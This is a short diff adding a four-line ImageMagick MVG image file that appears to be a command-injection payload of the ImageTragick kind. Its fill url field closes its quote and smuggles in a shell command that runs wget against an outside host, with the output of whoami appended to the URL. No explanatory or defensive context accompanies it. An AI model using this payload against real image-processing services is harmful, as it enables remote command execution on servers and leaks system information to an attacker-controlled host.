@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"| wget http://app.ikow.cn/$(whoami)")'
+pop graphic-context
